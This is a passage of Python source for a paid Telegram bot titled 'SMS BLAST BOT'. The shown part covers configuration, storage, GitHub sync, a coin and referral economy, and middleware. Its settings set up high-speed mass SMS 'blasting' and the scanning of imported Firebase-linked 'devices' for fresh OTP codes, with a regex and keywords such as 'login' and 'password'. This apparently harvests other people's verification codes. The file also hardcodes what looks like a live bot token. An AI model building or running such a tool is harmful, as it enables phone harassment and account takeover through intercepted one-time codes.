# ============================================================
#  SMS BLAST BOT — v7.0 SANJIPRO APEX PRO
#  Full features • GitHub sync • Force join strict • OTP fresh
#  Multi-device • Coins • Firebase bulk import • Scheduler
# ============================================================
#  INSTALL:
#    pip install -r requirements.txt
#  RUN:
#    python bot.py
# ============================================================

import asyncio
import base64
import copy
import csv
import io
import json
import logging
import os
import random
import re
import signal
import string
import sys
import threading
import time
from copy import deepcopy
from datetime import datetime, timedelta
from html import escape as html_escape
from urllib.parse import urlparse

# ---- load .env if exists ----
try:
    from dotenv import load_dotenv
    load_dotenv()
except Exception:
    pass

import aiohttp
from aiogram import BaseMiddleware, Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramBadRequest, TelegramRetryAfter, TelegramForbiddenError
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    BufferedInputFile, CallbackQuery, FSInputFile,
    InlineKeyboardButton, InlineKeyboardMarkup, Message,
)

# ============================================================
#  LOGGING
# ============================================================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S",
    handlers=[logging.StreamHandler(sys.stdout)]
)
log = logging.getLogger("Sanjipro")

# ============================================================
#  CONFIG — from env with fallbacks
# ============================================================
def _env_int(key, default):
    try:
        return int(os.environ.get(key, str(default)).strip())
    except Exception:
        return default

def _env_str(key, default=""):
    v = os.environ.get(key)
    return v if v is not None else default

BOT_TOKEN = _env_str("BOT_TOKEN", "8860454523:AAHYGLiLxzzHXN1Dzz2MGQ4XQP_TDYpkSFo")
LOG_CHANNEL_ID = _env_int("LOG_CHANNEL_ID", -1003994612182)
MAIN_OWNER = _env_int("MAIN_OWNER", 7966027018)
SUPER_ADMIN_NAME = _env_str("SUPER_ADMIN_NAME", "sanjipro")
SUPER_ADMIN_LINK = _env_str("SUPER_ADMIN_LINK", "https://t.me/sanjipro5")
SUPER_ADMINS = [MAIN_OWNER]

# ---- GitHub persistence ----
GITHUB_TOKEN = _env_str("GITHUB_TOKEN", "").strip()
GITHUB_REPO = _env_str("GITHUB_REPO", "sanwarml90-bot/Newbotbot").strip()
GITHUB_BRANCH = _env_str("GITHUB_BRANCH", "main").strip()
GITHUB_FILE = _env_str("GITHUB_FILE", "sanjipro_data.json").strip()
GITHUB_SYNC_INTERVAL = _env_int("GITHUB_SYNC_INTERVAL", 300)  # 5 min
GITHUB_ENABLED = bool(GITHUB_TOKEN and GITHUB_REPO)

# ---- data dir ----
_DATA_DIR = _env_str("SANJIPRO_DATA_DIR", "").strip()
if not _DATA_DIR:
    _DATA_DIR = os.path.join(os.path.expanduser("~"), ".sanjipro_data")
try:
    os.makedirs(_DATA_DIR, exist_ok=True)
except Exception:
    _DATA_DIR = "."

_DATA_FILE = os.path.join(_DATA_DIR, "sanjipro_data.json")
_BACKUP_FILE = os.path.join(_DATA_DIR, "sanjipro_data.backup.json")
_BACKUP_FILE_2 = os.path.join(_DATA_DIR, "sanjipro_data.backup2.json")
_TMP_FILE = os.path.join(_DATA_DIR, "sanjipro_data.tmp.json")
_LOCK_FILE = os.path.join(_DATA_DIR, ".sanjipro.lock")
_HEARTBEAT_FILE = os.path.join(_DATA_DIR, ".sanjipro.heartbeat")

_VERSION = "7.0 Sanjipro"
_START_TIME = time.time()

# ---- timeouts / limits ----
_WATCHDOG_INTERVAL = 30
_HEARTBEAT_INTERVAL = 15
_WATCHDOG_MAX_FAILS = 5
_LOCK_STALE_SEC = 180
_CALLBACK_CONCURRENCY = 100
_USER_COOLDOWN_SEC = 0.3
_GLOBAL_BLAST_LIMIT = 500
_BLAST_QUEUE_MAX = 50

SPEED_FAST = 0.001
SPEED_MEDIUM = 0.05
SPEED_SLOW = 0.2
SPEED_DEFAULT = SPEED_FAST
_SEND_CONCURRENCY = 70

CURRENT_POWER_MODE = 2
ALLOWED_POWER_MODES = (2, 3, 4, 5, 10)

# ---- firebase scan ----
_FB_CONCURRENCY = 200
_DEV_CONCURRENCY = 400
_HTTP_CONNECT_TIMEOUT = 5
_HTTP_READ_TIMEOUT = 8
_HTTP_POOL_LIMIT = 1000
_HTTP_PER_HOST = 100
_DNS_CACHE_TTL = 600
_DEVICE_BATCH = 100
_BACKGROUND_SCAN_INTERVAL = 10.0
_PROGRESS_UPDATE_INTERVAL = 3.0
_PANEL_REFRESH_INTERVAL = 20.0

# ---- otp ----
_OTP_LIVE_TIMEOUT = 300          # 5 min live mode
_OTP_POLL_INTERVAL = 4           # poll every 4 sec
_OTP_COST_DEFAULT = 1
_OTP_FRESH_WINDOW = 900          # 15 min default freshness
_OTP_MAX_SCAN = 300              # max messages to scan per device
_OTP_REGEX = re.compile(r"\b\d{4,8}\b")
_OTP_KEYWORDS = (
    "otp", "code", "verify", "verification", "pin",
    "login", "secure", "password", "passcode", "auth"
)

# ---- firebase import ----
_FB_UPLOAD_WAIT = 3.0
_URL_REGEX = re.compile(r"https?://[^\s<>\"'\)\]]+")

# ---- force join ----
_FJ_CHECK_TIMEOUT = 8
_FJ_RETRY_INTERVAL = 30

# ---- scheduler ----
_SCHED_TICK = 15

# ---- coin economy ----
_DAILY_BONUS_COINS = _env_int("DAILY_BONUS_COINS", 2)
_DAILY_BONUS_HOURS = 24

# ---- scanner adaptive ----
_SCAN_ADAPTIVE_MIN = 5
_SCAN_ADAPTIVE_MAX = 30

# ============================================================
#  EMOJI IDs
# ============================================================
EMOJI_FIRE     = "5289722755871162900"
EMOJI_STAR     = "5372849966689566579"
EMOJI_ROCKET   = "5359664288241829619"
EMOJI_CROWN    = "6237927637906364256"
EMOJI_SHIELD   = "6235476345451716705"
EMOJI_MONEY    = "6244678063775289843"
EMOJI_PHONE    = "6239930832128056797"
EMOJI_CHECK    = "4958689671950369798"
EMOJI_CROSS    = "4958900559139570572"
EMOJI_WARNING  = "4958526153955476488"
EMOJI_LOCK     = "4956719506027185156"
EMOJI_GIFT     = "5084613633418199991"
EMOJI_BELL     = "5098265504796115765"
EMOJI_GEAR     = "5116414868357907335"
EMOJI_VIDEO    = "5372849966689566579"
EMOJI_COIN     = "5375298751547576690"
EMOJI_OTP      = "5431584540232207838"
EMOJI_USER     = "5373098009640836781"
EMOJI_SEARCH   = "5258396243666681158"
EMOJI_CLOCK    = "5382194935057372936"
EMOJI_CHART    = "5384369298343860451"
EMOJI_PLUS     = "5391159900976473065"
EMOJI_MINUS    = "5393312304441345779"
EMOJI_FILE     = "5445353826677358176"
EMOJI_HOURGLASS = "5382194935057372936"
EMOJI_TAG      = "5373098009640836781"
FIRE_EFFECT_ID = "5104841245755180586"

# ============================================================
#  HELPERS — small caps, escaping, buttons
# ============================================================
_SC_MAP = str.maketrans(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789"
)

def sc(t): return (t or "").translate(_SC_MAP)
def em(eid, fb="⭐"): return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>' if eid else fb
def esc(v): return html_escape(str(v if v is not None else ""))
def now_ts(): return int(time.time())

def btn(text, cb, eid=None, fb="", style=None):
    label = f"{fb} {sc(text)}".strip() if (fb and not eid) else sc(text)
    kwargs = {"text": label, "callback_data": cb}
    if eid:
        try: kwargs["icon_custom_emoji_id"] = eid
        except Exception: pass
    if style in ("primary", "success", "danger"):
        try: kwargs["style"] = style
        except Exception: pass
    try:
        return InlineKeyboardButton(**kwargs)
    except TypeError:
        return InlineKeyboardButton(text=label, callback_data=cb)

def btn_url(text, url, eid=None, fb="", style=None):
    label = f"{fb} {sc(text)}".strip() if (fb and not eid) else sc(text)
    kwargs = {"text": label, "url": url}
    if eid:
        try: kwargs["icon_custom_emoji_id"] = eid
        except Exception: pass
    if style in ("primary", "success", "danger"):
        try: kwargs["style"] = style
        except Exception: pass
    try:
        return InlineKeyboardButton(**kwargs)
    except TypeError:
        return InlineKeyboardButton(text=label, url=url)

def kb(*rows):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t, callback_data=c) for t, c in row] for row in rows
    ])

# ============================================================
#  GLOBAL STATE
# ============================================================
_DB_LOCK = threading.RLock()
_DATA_CACHE = None
_HTTP_SESSION = None
_SHUTDOWN_REQUESTED = False

USER_SESSIONS = {}
SESSIONS_LOCK = asyncio.Lock()
CACHED_DEVICES = []
LAST_SCAN_TIME = 0.0
LAST_SCAN_DURATION = 0.0
SCANNING_IN_PROGRESS = False
DEVICE_HEALTH_LOG = []
FB_DEVICE_COUNTS = {}
SCAN_LOCK = asyncio.Lock()
PROTECTED_NUMBERS = {}
FB_SCAN_ERRORS = {}
LAST_KNOWN_DEVICE_COUNT = 0
LAST_KNOWN_FB_COUNTS = {}

OTP_LIVE_SESSIONS = {}
OTP_WATCH_SESSIONS = {}
_FB_UPLOAD_BATCH = {}
SCHEDULED_BLASTS = []
ACTIVE_BLAST_QUEUE = []
LAST_ACTIVITY_TS = time.time()

_BG_TASKS = set()

CALLBACK_SEM = asyncio.Semaphore(_CALLBACK_CONCURRENCY)
GLOBAL_BLAST_SEM = asyncio.Semaphore(_GLOBAL_BLAST_LIMIT)
_USER_COOLDOWN = {}
_OWNER_PANEL_STATE = {}
_GITHUB_SYNC_LOCK = asyncio.Lock()

def _spawn(coro):
    t = asyncio.create_task(coro)
    _BG_TASKS.add(t)
    t.add_done_callback(_BG_TASKS.discard)
    return t

def _touch_activity():
    global LAST_ACTIVITY_TS
    LAST_ACTIVITY_TS = time.time()

# ============================================================
#  SINGLE INSTANCE LOCK
# ============================================================
def _acquire_lock():
    if os.path.exists(_LOCK_FILE):
        try:
            age = time.time() - os.path.getmtime(_LOCK_FILE)
            if age > _LOCK_STALE_SEC:
                try: os.remove(_LOCK_FILE)
                except Exception: pass
            else:
                with open(_LOCK_FILE, "r") as f:
                    old_pid = int(f.read().strip())
                if old_pid == os.getpid():
                    return
                if sys.platform == "win32":
                    try: os.remove(_LOCK_FILE)
                    except Exception: pass
                else:
                    try:
                        os.kill(old_pid, 0)
                        log.critical(f"Another instance PID={old_pid}. Exit.")
                        sys.exit(1)
                    except OSError:
                        try: os.remove(_LOCK_FILE)
                        except Exception: pass
        except Exception:
            try: os.remove(_LOCK_FILE)
            except Exception: pass
    try:
        with open(_LOCK_FILE, "w") as f:
            f.write(str(os.getpid()))
    except Exception as e:
        log.warning(f"Lock write failed: {e}")

def _release_lock():
    try:
        if os.path.exists(_LOCK_FILE): os.remove(_LOCK_FILE)
    except Exception: pass

def _heartbeat():
    try:
        with open(_HEARTBEAT_FILE, "w") as f:
            f.write(str(int(time.time())))
    except Exception: pass

# ============================================================
#  HTTP SESSION (singleton)
# ============================================================
async def get_http_session():
    global _HTTP_SESSION
    if _HTTP_SESSION is None or _HTTP_SESSION.closed:
        connector = aiohttp.TCPConnector(
            limit=_HTTP_POOL_LIMIT, limit_per_host=_HTTP_PER_HOST,
            ttl_dns_cache=_DNS_CACHE_TTL, force_close=False,
            enable_cleanup_closed=True,
        )
        _HTTP_SESSION = aiohttp.ClientSession(connector=connector)
    return _HTTP_SESSION

async def close_http_session():
    global _HTTP_SESSION
    if _HTTP_SESSION and not _HTTP_SESSION.closed:
        try: await _HTTP_SESSION.close()
        except Exception: pass
    _HTTP_SESSION = None

# ============================================================
#  DEFAULT DATA SHAPE
# ============================================================
def _default_data():
    return {
        "owners": [MAIN_OWNER],
        "admins": [],
        "banned": [],
        "approved": [],
        "firebases": [],
        "users": {},
        "stats": {"total_sent": 0, "total_failed": 0, "api_usage": {}},
        "force_join": {
            "enabled": False,
            "channels": [],
            "bypass": [],
        },
        "pricing": {"plans": []},
        "redeem_codes": {},
        "settings": {
            "ref_credits": 3,
            "ref_coins": 1,
            "max_owners": 6,
            "owner_display": SUPER_ADMIN_NAME,
            "otp_cost": _OTP_COST_DEFAULT,
            "otp_fresh_window": _OTP_FRESH_WINDOW,
            "maintenance": False,
            "maintenance_msg": "🔧 Bot is under maintenance. Please try again later.",
            "daily_bonus_coins": _DAILY_BONUS_COINS,
            "strict_force_join": True,
            "daily_report": True,
        },
        "sms_history": {},
        "otp_history": {},
        "otp_favorites": {},
        "activity_log": [],
        "audit_log": [],
        "protected_numbers": {},
        "videos": [],
        "ban_reasons": {},
        "user_notes": {},
        "user_tags": {},
        "user_groups": {},
        "referral_tree": {},
        "transactions": {},
        "templates": {},
        "scheduled": [],
        "firebase_health": {},
        "firebase_meta": {},
        "appeals": [],
        "tickets": [],
        "announcements": [],
        "coin_expiry": {"enabled": False, "days": 0},
        "watchdog_stats": {"scanner_fails": 0, "otp_fails": 0, "github_fails": 0},
        "last_github_sync": 0,
        "version": _VERSION,
    }

# ============================================================
#  DEEP MERGE
# ============================================================
def _merge(data, defaults):
    for k, v in defaults.items():
        if k not in data:
            data[k] = deepcopy(v)
        elif isinstance(v, dict) and isinstance(data.get(k), dict):
            _merge(data[k], v)
    return data

def _read_json(path):
    with open(path, "r", encoding="utf-8") as f:
        return json.load(f)

# ============================================================
#  LOAD FROM DISK
# ============================================================
def _load_from_disk():
    global PROTECTED_NUMBERS
    candidates = [_DATA_FILE, _BACKUP_FILE, _BACKUP_FILE_2]
    for path in candidates:
        if not os.path.exists(path):
            continue
        try:
            data = _read_json(path)
            _merge(data, _default_data())
            if MAIN_OWNER not in data.get("owners", []):
                data["owners"].insert(0, MAIN_OWNER)
            # normalize users
            for u in data.get("users", {}).values():
                u.setdefault("credits", 0)
                u.setdefault("coins", 0)
                u.setdefault("sms_history", [])
                u.setdefault("manual_added_credits", 0)
                u.setdefault("manual_added_coins", 0)
                u.setdefault("uses", 0)
                u.setdefault("otp_uses", 0)
                u.setdefault("joined_at", now_ts())
                u.setdefault("last_active", 0)
                u.setdefault("daily_bonus_ts", 0)
                u.setdefault("tags", [])
                u.setdefault("notes", "")
                u.setdefault("premium", False)
            PROTECTED_NUMBERS = data.get("protected_numbers", {}) or {}
            log.info(f"[DATA] loaded from {path}")
            return data
        except Exception as e:
            log.error(f"[DATA] load failed {path}: {e}")
    # fresh
    d = _default_data()
    try:
        with open(_DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(d, f, indent=2, ensure_ascii=False)
    except Exception as e:
        log.error(f"[DATA] init write failed: {e}")
    return d

def load():
    global _DATA_CACHE
    with _DB_LOCK:
        if _DATA_CACHE is None:
            _DATA_CACHE = _load_from_disk()
        return _DATA_CACHE

# ============================================================
#  ATOMIC SAVE (local + async github push)
# ============================================================
def _write_local_sync(d):
    try:
        with open(_TMP_FILE, "w", encoding="utf-8") as f:
            json.dump(d, f, indent=2, ensure_ascii=False)
            f.flush()
            try:
                os.fsync(f.fileno())
            except Exception:
                pass
        # rotate backups
        if os.path.exists(_BACKUP_FILE):
            try:
                os.replace(_BACKUP_FILE, _BACKUP_FILE_2)
            except Exception:
                pass
        if os.path.exists(_DATA_FILE):
            try:
                os.replace(_DATA_FILE, _BACKUP_FILE)
            except Exception:
                pass
        os.replace(_TMP_FILE, _DATA_FILE)
        return True
    except Exception as e:
        log.error(f"[SAVE] local write failed: {e}")
        return False

def save(_d=None, push_github=True):
    with _DB_LOCK:
        d = _d if _d is not None else _DATA_CACHE
        if d is None:
            return
        d["protected_numbers"] = PROTECTED_NUMBERS
        d["last_github_sync"] = int(time.time())
        ok = _write_local_sync(d)
        if ok and push_github and GITHUB_ENABLED:
            try:
                _spawn(_github_push_safe(d))
            except Exception:
                pass

# ============================================================
#  GITHUB SYNC
# ============================================================
_GH_API = "https://api.github.com"

def _gh_headers():
    return {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3+json",
        "User-Agent": "sanjipro-bot",
    }

def _gh_url():
    return f"{_GH_API}/repos/{GITHUB_REPO}/contents/{GITHUB_FILE}"

async def _github_pull():
    """Return dict or None."""
    if not GITHUB_ENABLED:
        return None
    url = f"{_gh_url()}?ref={GITHUB_BRANCH}"
    try:
        sess = await get_http_session()
        async with sess.get(url, headers=_gh_headers(),
                            timeout=aiohttp.ClientTimeout(total=20)) as r:
            if r.status == 200:
                j = await r.json()
                content_b64 = j.get("content") or ""
                # remove whitespace
                content_b64 = "".join(content_b64.split())
                raw = base64.b64decode(content_b64).decode("utf-8")
                data = json.loads(raw)
                log.info("[GH] data pulled")
                return data
            elif r.status == 404:
                log.info("[GH] file not found on repo (first run)")
            else:
                log.warning(f"[GH] pull status {r.status}")
    except Exception as e:
        log.warning(f"[GH] pull failed: {e}")
        try:
            load()["watchdog_stats"]["github_fails"] = load()["watchdog_stats"].get("github_fails", 0) + 1
        except Exception:
            pass
    return None

async def _github_push_safe(data):
    async with _GITHUB_SYNC_LOCK:
        try:
            await _github_push(data)
        except Exception as e:
            log.warning(f"[GH] push failed: {e}")

async def _github_push(data):
    if not GITHUB_ENABLED:
        return
    url = _gh_url()
    headers = _gh_headers()
    try:
        content = json.dumps(data, indent=2, ensure_ascii=False).encode("utf-8")
        content_b64 = base64.b64encode(content).decode("utf-8")
        sess = await get_http_session()
        # get current sha
        sha = None
        async with sess.get(f"{url}?ref={GITHUB_BRANCH}", headers=headers,
                            timeout=aiohttp.ClientTimeout(total=10)) as r:
            if r.status == 200:
                try:
                    j = await r.json()
                    sha = j.get("sha")
                except Exception:
                    pass
        payload = {
            "message": f"auto-save {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            "content": content_b64,
            "branch": GITHUB_BRANCH,
        }
        if sha:
            payload["sha"] = sha
        async with sess.put(url, headers=headers, json=payload,
                            timeout=aiohttp.ClientTimeout(total=25)) as r:
            if r.status in (200, 201):
                log.info("[GH] data pushed")
            else:
                body = await r.text()
                log.warning(f"[GH] push status {r.status}: {body[:120]}")
    except Exception as e:
        log.warning(f"[GH] push exception: {e}")
        try:
            load()["watchdog_stats"]["github_fails"] = load()["watchdog_stats"].get("github_fails", 0) + 1
        except Exception:
            pass

async def github_sync_loop():
    while True:
        try:
            await asyncio.sleep(GITHUB_SYNC_INTERVAL)
            if not GITHUB_ENABLED:
                continue
            d = load()
            await _github_push(d)
        except asyncio.CancelledError:
            raise
        except Exception as e:
            log.warning(f"[GH] sync loop error: {e}")
            await asyncio.sleep(60)

# ============================================================
#  USER HELPERS
# ============================================================
def reg_user(uid, name, d):
    k = str(uid)
    if k not in d["users"]:
        d["users"][k] = {
            "name": str(name)[:64],
            "uses": 0,
            "otp_uses": 0,
            "credits": 0,
            "coins": 0,
            "manual_added_credits": 0,
            "manual_added_coins": 0,
            "joined_at": now_ts(),
            "last_active": now_ts(),
            "daily_bonus_ts": 0,
            "refer_code": None,
            "referred_by": None,
            "sms_history": [],
            "tags": [],
            "notes": "",
            "premium": False,
        }
        return True
    return False

def log_activity(d, action, uid, details=""):
    d.setdefault("activity_log", []).append({
        "timestamp": now_ts(),
        "uid": uid,
        "action": action,
        "details": str(details)[:300],
    })
    if len(d["activity_log"]) > 800:
        d["activity_log"] = d["activity_log"][-800:]

def log_audit(d, action, uid, details=""):
    d.setdefault("audit_log", []).append({
        "timestamp": now_ts(),
        "uid": uid,
        "action": action,
        "details": str(details)[:400],
    })
    if len(d["audit_log"]) > 1000:
        d["audit_log"] = d["audit_log"][-1000:]

def is_main_owner(uid): return uid == MAIN_OWNER
def is_owner(uid, d): return uid in d.get("owners", [MAIN_OWNER]) or uid in SUPER_ADMINS
def is_admin(uid, d): return is_owner(uid, d) or uid in d.get("admins", [])
def is_banned(uid, d): return uid in d.get("banned", [])
def is_premium(uid, d):
    u = d.get("users", {}).get(str(uid), {})
    return bool(u.get("premium", False))

def can_use(uid, d):
    if is_banned(uid, d):
        return False
    if is_admin(uid, d):
        return True
    if d.get("settings", {}).get("maintenance"):
        return False
    return True

def role_tag(uid, d):
    if is_main_owner(uid): return f"{em(EMOJI_CROWN, '👑')} ᴍᴀɪɴ ᴏᴡɴᴇʀ"
    if is_owner(uid, d): return f"{em(EMOJI_CROWN, '🔱')} ᴏᴡɴᴇʀ"
    if uid in d.get("admins", []): return f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴ"
    if is_premium(uid, d): return f"{em(EMOJI_STAR, '💎')} ᴘʀᴇᴍɪᴜᴍ"
    return f"{em(EMOJI_GIFT, '🆓')} ғʀᴇᴇ ᴜsᴇʀ"

def get_user_credits(uid, d):
    return int(d.get("users", {}).get(str(uid), {}).get("credits", 0))

def get_user_coins(uid, d):
    return int(d.get("users", {}).get(str(uid), {}).get("coins", 0))

def get_owner_display(d):
    val = d.get("settings", {}).get("owner_display", SUPER_ADMIN_NAME)
    if val is None:
        return ""
    return str(val).strip()

def get_otp_cost(d):
    try:
        return int(d.get("settings", {}).get("otp_cost", _OTP_COST_DEFAULT))
    except Exception:
        return _OTP_COST_DEFAULT

def get_otp_fresh_window(d):
    try:
        return int(d.get("settings", {}).get("otp_fresh_window", _OTP_FRESH_WINDOW))
    except Exception:
        return _OTP_FRESH_WINDOW

def get_user_send_limit(uid, d):
    v = d.get("users", {}).get(str(uid), {}).get("max_send_limit")
    if v is None:
        return None
    try:
        return int(v)
    except (TypeError, ValueError):
        return None

def get_user_otp_limit(uid, d):
    v = d.get("users", {}).get(str(uid), {}).get("max_otp_limit")
    if v is None:
        return None
    try:
        return int(v)
    except (TypeError, ValueError):
        return None

def set_user_send_limit(uid, limit, d):
    k = str(uid)
    if k not in d.get("users", {}):
        d["users"][k] = {
            "credits": 0, "coins": 0,
            "manual_added_credits": 0, "manual_added_coins": 0,
            "name": "User",
        }
    if limit is None:
        d["users"][k].pop("max_send_limit", None)
    else:
        d["users"][k]["max_send_limit"] = int(limit)

def set_user_otp_limit(uid, limit, d):
    k = str(uid)
    if k not in d.get("users", {}):
        d["users"][k] = {
            "credits": 0, "coins": 0,
            "manual_added_credits": 0, "manual_added_coins": 0,
            "name": "User",
        }
    if limit is None:
        d["users"][k].pop("max_otp_limit", None)
    else:
        d["users"][k]["max_otp_limit"] = int(limit)

# ============================================================
#  CREDITS / COINS
# ============================================================
def add_credits(uid, amount, d, is_manual=False, reason=""):
    k = str(uid)
    if k not in d.get("users", {}):
        d["users"][k] = {"credits": 0, "coins": 0,
                         "manual_added_credits": 0, "manual_added_coins": 0}
    d["users"][k].setdefault("manual_added_credits", 0)
    d["users"][k]["credits"] = d["users"][k].get("credits", 0) + int(amount)
    if is_manual:
        d["users"][k]["manual_added_credits"] += int(amount)
    _log_tx(d, uid, "credits", int(amount), reason)

def add_coins(uid, amount, d, is_manual=False, reason=""):
    k = str(uid)
    if k not in d.get("users", {}):
        d["users"][k] = {"credits": 0, "coins": 0,
                         "manual_added_credits": 0, "manual_added_coins": 0}
    d["users"][k].setdefault("manual_added_coins", 0)
    d["users"][k]["coins"] = d["users"][k].get("coins", 0) + int(amount)
    if is_manual:
        d["users"][k]["manual_added_coins"] += int(amount)
    _log_tx(d, uid, "coins", int(amount), reason)

def deduct_credits(uid, amount, d, reason=""):
    k = str(uid)
    if k in d.get("users", {}):
        if d["users"][k].get("credits", 0) >= amount:
            d["users"][k]["credits"] -= amount
            _log_tx(d, uid, "credits", -int(amount), reason)
            return True
    return False

def deduct_coins(uid, amount, d, reason=""):
    k = str(uid)
    if k in d.get("users", {}):
        if d["users"][k].get("coins", 0) >= amount:
            d["users"][k]["coins"] -= amount
            _log_tx(d, uid, "coins", -int(amount), reason)
            return True
    return False

def _log_tx(d, uid, currency, delta, reason=""):
    hist = d.setdefault("transactions", {}).setdefault(str(uid), [])
    hist.append({
        "ts": now_ts(),
        "currency": currency,
        "delta": delta,
        "reason": reason[:80],
    })
    if len(hist) > 500:
        d["transactions"][str(uid)] = hist[-500:]

# ============================================================
#  REFERRAL
# ============================================================
def generate_refer_code(uid, d):
    k = str(uid)
    if k in d.get("users", {}) and d["users"][k].get("refer_code"):
        return d["users"][k]["refer_code"]
    existing = {u.get("refer_code") for u in d.get("users", {}).values() if u.get("refer_code")}
    for _ in range(30):
        code = "SJ" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        if code not in existing:
            break
    else:
        code = "SJ" + str(now_ts())[-8:]
    if k in d.get("users", {}):
        d["users"][k]["refer_code"] = code
    return code

def process_referral(new_uid, code, d):
    referrer_uid = None
    for uid_str, udata in d.get("users", {}).items():
        if udata.get("refer_code") == code:
            referrer_uid = int(uid_str)
            break
    if not referrer_uid:
        return False, "Invalid", None
    if referrer_uid == new_uid:
        return False, "Self", None
    if d["users"].get(str(new_uid), {}).get("referred_by"):
        return False, "Already", None
    rc = int(d.get("settings", {}).get("ref_credits", 3))
    rcoin = int(d.get("settings", {}).get("ref_coins", 1))
    add_credits(new_uid, rc, d, False, "referral")
    add_coins(new_uid, rcoin, d, False, "referral")
    add_credits(referrer_uid, rc, d, False, "referral-bonus")
    add_coins(referrer_uid, rcoin, d, False, "referral-bonus")
    d["users"][str(new_uid)]["referred_by"] = referrer_uid
    d.setdefault("referral_tree", {}).setdefault(str(referrer_uid), []).append(int(new_uid))
    save(d)
    return True, f"+{rc} credits +{rcoin} coins", referrer_uid

# ============================================================
#  FORMATTERS
# ============================================================
def mask_number(number):
    n = str(number or "")
    if len(n) <= 4:
        return n
    return n[:2] + "******" + n[-4:]

def fmt_time(ts):
    try:
        return datetime.fromtimestamp(int(ts)).strftime("%d/%m/%Y %H:%M")
    except Exception:
        return "—"

def fmt_time_short(ts):
    try:
        return datetime.fromtimestamp(int(ts)).strftime("%H:%M:%S")
    except Exception:
        return "—"

def fmt_date(ts):
    try:
        return datetime.fromtimestamp(int(ts)).strftime("%d/%m/%Y")
    except Exception:
        return "—"

def fmt_duration(seconds):
    s = int(seconds)
    if s < 60:
        return f"{s}s"
    if s < 3600:
        return f"{s // 60}m {s % 60}s"
    return f"{s // 3600}h {(s % 3600) // 60}m {s % 60}s"

def fmt_age(ts):
    if not ts:
        return "never"
    d = now_ts() - int(ts)
    if d < 60:
        return f"{d}s ago"
    if d < 3600:
        return f"{d // 60}m ago"
    if d < 86400:
        return f"{d // 3600}h ago"
    return f"{d // 86400}d ago"

def progress_bar(cur, total, w=20):
    if total <= 0:
        return "░" * w
    f = min(w, int(w * cur / total))
    return "█" * f + "░" * (w - f)

def truncate(s, n=200):
    s = str(s or "")
    if len(s) <= n:
        return s
    return s[:n - 3] + "..."

# ============================================================
#  SCAN STATUS
# ============================================================
def get_scan_status():
    cur = len(CACHED_DEVICES) * CURRENT_POWER_MODE
    cnt = cur if cur > 0 else LAST_KNOWN_DEVICE_COUNT
    if SCANNING_IN_PROGRESS:
        return f"{em(EMOJI_WARNING, '🔍')} {cnt} ᴀᴘɪs • sᴄᴀɴɴɪɴɢ" if cnt else f"{em(EMOJI_WARNING, '🔍')} sᴄᴀɴɴɪɴɢ..."
    if cnt == 0:
        return f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs"
    td = time.time() - LAST_SCAN_TIME if LAST_SCAN_TIME > 0 else 999
    if td < 30:
        return f"{em(EMOJI_CHECK, '🟢')} {cnt} ᴀᴘɪs"
    if td < 120:
        return f"{em(EMOJI_WARNING, '🟡')} {cnt} ᴀᴘɪs ({int(td)}s ᴏʟᴅ)"
    return f"{em(EMOJI_CROSS, '🔴')} {cnt} ᴀᴘɪs ({int(td / 60)}ᴍ ᴏʟᴅ)"

# ============================================================
#  SAFE EDIT (bulletproof back buttons)
# ============================================================
async def safe_edit(cq: CallbackQuery, text: str, markup=None, disable_preview: bool = True):
    try:
        await cq.message.edit_text(
            text,
            reply_markup=markup,
            parse_mode="HTML",
            disable_web_page_preview=disable_preview,
        )
        return
    except TelegramBadRequest as e:
        if "not modified" in str(e).lower():
            return
    except TelegramRetryAfter as e:
        await asyncio.sleep(min(e.retry_after, 5))
    except Exception:
        pass
    try:
        await cq.message.answer(
            text,
            reply_markup=markup,
            parse_mode="HTML",
            disable_web_page_preview=disable_preview,
        )
    except Exception:
        pass

# ============================================================
#  MIDDLEWARES
# ============================================================
class CallbackSemaphoreMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        async with CALLBACK_SEM:
            return await handler(event, data)


class UserCooldownMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        try:
            if isinstance(event, CallbackQuery) and event.from_user:
                uid = event.from_user.id
                now = time.time()
                last = _USER_COOLDOWN.get(uid, 0)
                if now - last < _USER_COOLDOWN_SEC:
                    try:
                        await event.answer()
                    except Exception:
                        pass
                    return
                _USER_COOLDOWN[uid] = now
                if len(_USER_COOLDOWN) > 20000:
                    cutoff = now - 120
                    for k in list(_USER_COOLDOWN.keys()):
                        if _USER_COOLDOWN[k] < cutoff:
                            _USER_COOLDOWN.pop(k, None)
                # update last_active
                _touch_activity()
                try:
                    d = load()
                    k = str(uid)
                    if k in d.get("users", {}):
                        d["users"][k]["last_active"] = int(now)
                except Exception:
                    pass
        except Exception:
            pass
        return await handler(event, data)


class OwnerPanelResetMiddleware(BaseMiddleware):
    KEEP_ACTIVE = {
        "owner:home", "owner:refresh", "noop",
        "owner:toggle_maint",
        "owner:set_power:2", "owner:set_power:3",
        "owner:set_power:4", "owner:set_power:5",
        "owner:set_power:10",
        "owner:panels:auto",
    }

    async def __call__(self, handler, event, data):
        try:
            if isinstance(event, CallbackQuery) and event.from_user:
                uid = event.from_user.id
                st = _OWNER_PANEL_STATE.get(uid)
                if st:
                    st["last_user_action"] = time.time()
                    if event.data not in self.KEEP_ACTIVE:
                        st["active"] = False
